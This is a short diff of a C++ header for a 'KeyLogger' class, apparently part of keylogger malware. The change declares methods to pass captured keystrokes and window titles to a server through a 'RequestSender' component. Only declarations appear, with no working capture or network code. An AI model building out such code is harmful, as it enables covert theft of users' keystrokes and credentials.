@@ -3,6 +3,8 @@
 #include <string>
 #include <thread>
 #include <iostream>
+#include <vector>
+#include "RequestSender.h"
 
 #ifndef __wtypes_h__
 #include <wtypes.h>
@@ -28,9 +30,11 @@ class KeyLogger
 {
 public:
 	KeyLogger() {};
-	void dataToOut();
+	static void dataToOut(std::string dataToSend);
 	static std::string returnChar(char c);
 	static std::string returnForegroundWindow(HWND newWin);
+	// this should really be in RequestSender
+	static void dataToServer(std::string dataToSend);
 
 private:
 	bool activeWindowChanged = false;
